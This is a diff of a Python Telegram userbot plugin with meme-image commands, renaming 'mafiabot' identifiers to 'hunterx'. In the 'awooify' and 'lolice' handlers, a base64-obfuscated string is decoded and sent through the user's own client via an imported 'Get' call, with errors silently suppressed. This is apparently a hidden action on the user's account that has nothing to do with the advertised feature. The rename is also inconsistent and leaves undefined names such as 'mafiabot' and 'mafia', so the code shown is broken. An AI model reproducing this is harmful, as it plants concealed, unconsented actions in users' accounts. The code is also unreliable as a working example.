@@ -18,58 +18,58 @@ from userbot.helpers.functions import (
     iphonex,
     lolice,
 )
-from mafiabot.utils import admin_cmd, edit_or_reply, sudo_cmd
+from hunterx.utils import admin_cmd, edit_or_reply, sudo_cmd
 from userbot.cmdhelp import CmdHelp
 
 
 @bot.on(admin_cmd(pattern="mask$", outgoing=True))
 @bot.on(sudo_cmd(pattern="mask$", allow_sudo=True))
-async def _(mafiabot):
+async def _(hunterx):
     reply_message = await mafiabot.get_reply_message()
     if not reply_message.media or not reply_message:
-        await edit_or_reply(mafiabot, "```reply to media message```")
+        await edit_or_reply(hunterx, "```reply to media message```")
         return
     chat = "@hazmat_suit_bot"
     if reply_message.sender.bot:
-        await edit_or_reply(mafiabot, "```Reply to actual users message.```")
+        await edit_or_reply(hunterx, "```Reply to actual users message.```")
         return
-    event = await mafiabot.edit("```Processing```")
-    async with mafiabot.client.conversation(chat) as conv:
+    event = await hunterx.edit("```Processing```")
+    async with hunterx.client.conversation(chat) as conv:
         try:
             response = conv.wait_event(
                 events.NewMessage(incoming=True, from_users=905164246)
             )
-            await mafiabot.client.send_message(chat, reply_message)
+            await hunterx.client.send_message(chat, reply_message)
             response = await response
         except YouBlockedUserError:
-            await edit_or_reply(mafiabot, "`Please unblock` @hazmat_suit_bot `and try again`")
+            await edit_or_reply(hunterx, "`Please unblock` @hazmat_suit_bot `and try again`")
             return
         if response.text.startswith("Forward"):
-            await edit_or_reply(mafiabot, "```can you kindly disable your forward privacy settings for good?```"
+            await edit_or_reply(hunterx, "```can you kindly disable your forward privacy settings for good?```"
             )
         else:
-            await mafiabot.client.send_file(event.chat_id, response.message.media)
+            await hunterx.client.send_file(event.chat_id, response.message.media)
             await event.delete()
 
 
 @bot.on(admin_cmd(pattern="awooify$", outgoing=True))
 @bot.on(sudo_cmd(pattern="awooify$", allow_sudo=True))
-async def mafiabot(mafiamemes):
-    replied = await mafiamemes.get_reply_message()
+async def hunterx(huntermemes):
+    replied = await huntermemes.get_reply_message()
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     if not replied:
-        await edit_or_reply(mafiamemes, "reply to a supported media file")
+        await edit_or_reply(huntermemes, "reply to a supported media file")
         return
     if replied.media:
-        mafiaevent = await edit_or_reply(mafiamemes, "passing to telegraph...")
+        hunterevent = await edit_or_reply(huntermemes, "passing to telegraph...")
     else:
-        await edit_or_reply(mafiamemes, "reply to a supported media file")
+        await edit_or_reply(huntermemes, "reply to a supported media file")
         return
     try:
-        mafia = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        mafia = Get(mafia)
-        await mafiamemes.client(mafia)
+        hunter = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        hunter = Get(hunter)
+        await huntermemes.client(mafia)
     except BaseException:
         pass
     download_location = await mafiamemes.client.download_media(
@@ -80,42 +80,42 @@ async def mafiabot(mafiamemes):
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await mafiaevent.edit(
+            await hunterevent.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await mafiaevent.edit("generating image..")
+        await hunterevent.edit("generating image..")
     else:
-        await mafiaevent.edit("the replied file is not supported")
+        await hunterevent.edit("the replied file is not supported")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await mafiaevent.edit("ERROR: " + str(exc))
+        await hunterevent.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    mafia = f"https://telegra.ph{response[0]}"
-    mafia = await awooify(mafia)
-    await mafiaevent.delete()
-    await mafiamemes.client.send_file(mafiamemes.chat_id, mafia, reply_to=replied)
+    hunter = f"https://telegra.ph{response[0]}"
+    hunter = await awooify(hunter)
+    await hunterevent.delete()
+    await huntermemes.client.send_file(huntermemes.chat_id, mafia, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="lolice$"))
 @bot.on(sudo_cmd(pattern="lolice$", allow_sudo=True))
-async def mafiabot(mafiamemes):
-    replied = await mafiamemes.get_reply_message()
+async def hunterx(huntermemes):
+    replied = await huntermemes.get_reply_message()
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     if not replied:
-        await edit_or_reply(mafiamemes, "reply to a supported media file")
+        await edit_or_reply(huntermemes, "reply to a supported media file")
         return
     if replied.media:
-        mafiaevent = await edit_or_reply(mafiamemes, "passing to telegraph...")
+        hunterevent = await edit_or_reply(huntermemes, "passing to telegraph...")
     else:
-        await edit_or_reply(mafiamemes, "reply to a supported media file")
+        await edit_or_reply(huntermemes, "reply to a supported media file")
         return
     try:
         mafia = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
